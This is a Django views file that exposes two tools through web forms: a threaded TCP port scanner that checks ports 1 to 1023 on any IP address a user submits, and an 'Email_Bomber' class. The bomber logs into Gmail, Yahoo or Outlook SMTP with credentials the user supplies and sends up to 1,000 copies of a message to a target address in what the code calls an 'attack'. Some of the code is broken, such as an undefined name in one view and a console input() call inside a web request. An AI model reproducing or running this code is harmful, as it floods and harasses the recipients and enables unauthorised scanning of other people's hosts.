from django.shortcuts import render
from queue import Queue
import threading
# Create your views here.
def home(request):
    return render(request,'app/base.html')

def type(request):
    return render(request,'app/index.html')
def port(request):
    import socket
    import threading
    from queue import Queue

    data = request.POST.get('text')
    target= data
    print(target)   #Write the ip address of target you want to scan
    queue=Queue()
    open_ports=[]

    def portscan(port):
        try:
            sock =socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((target, port))
            return True
        except:
            return False

    def fill_queue(port_list):
        for port in port_list:
            queue.put(port)

    def worker():
        while not queue.empty():
            port=queue.get()
            if portscan(port):
                print("Port {} is open".format(port))
                open_ports.append(port)

    port_list =range(1,1024)
    fill_queue(port_list)

    thread_list=[]
    for t in range(10):
        thread = threading.Thread(target=worker)
        thread_list.append(thread)

    for thread in thread_list:
        thread.start()

    for thread in thread_list:
        thread.join()

    return render(request,'app/port1.html',{'ports':open_ports})

def speech(request):
    temp=sub.value()
    return render(request,'app/ind.html',{'data':temp})


def bomb(request):
    return render(request,'app/form.html')

def result(request):
    '''imports'''
    import smtplib
    import sys

    class Email_Bomber:
        count = 0
        def __init__(self):
            try:
                print('\n **************[ Initializing program ]**************')
                self.target = request.POST.get('targetEmail')
                self.mode = int(request.POST.get('bombMode'))
                if int(self.mode) > int(4) or int(self.mode) < int(1):
                    print('ERROR: Invalid Option. GoodBye.')
                    sys.exit(1)
            except Exception as e:
                print(f'ERROR: {e}')

        def bomb(self):
            try:
                print('\n**************[ Setting up bomb ]**************')
                self.amount = None
                if self.mode == int(1):
                    self.amount = int(1000)
                elif self.mode == int(2):
                    self.amount = int(500)
                elif self.mode == int(3):
                    self.amount = int(250)
                else:
                    self.amount = int(request.POST.get('bombMode'))
                    print(f'\n**************[ You have selected BOMB mode: {self.mode} and {self.amount} emails ]**************')
            except Exception as e:
                print(f'ERROR: {e}')

        def email(self):
            try:
                print('\n**************[ Setting up email ]**************')
                self.server =request.POST.get('emailServer')
                premade = ['1', '2', '3']
                default_port = True
                if self.server not in premade:
                    default_port = False
                    self.port = int(input('Enter port number <: '))

                if default_port == True:
                    self.port = int(587)

                if self.server == '1':
                    self.server = 'smtp.gmail.com'
                elif self.server == '2':
                    self.server = 'smtp.mail.yahoo.com'
                elif self.server == '3':
                    self.server = 'smtp-mail.outlook.com'

                self.fromAddr = request.POST.get('fromEmail')
                self.fromPwd = request.POST.get('password')
                self.subject = request.POST.get('subject')
                self.message = request.POST.get('message')

                self.msg = '''From: %s\nTo: %s\nSubject %s\n%s\n
                ''' % (self.fromAddr, self.target, self.subject, self.message)

                self.s = smtplib.SMTP(self.server, self.port)
                self.s.ehlo()
                self.s.starttls()
                self.s.ehlo()
                self.s.login(self.fromAddr, self.fromPwd)
            except Exception as e:
                print(f'ERROR: {e}')

        def send(self):
            try:
                self.s.sendmail(self.fromAddr, self.target, self.msg)
                self.count +=1
                print(f'BOMB: {self.count}')
            except Exception as e:
                print(f'ERROR: {e}')

        def attack(self):
            print('\n**************[ Attacking... ]**************')
            for email in range(self.amount+1):
                self.send()
            self.s.close()
            print('**************[ Attack finished ]**************')
            #sys.exit(0)




    bomb = Email_Bomber()
    bomb.bomb()
    bomb.email()
    bomb.attack()
    return render(request,'app/def.html')
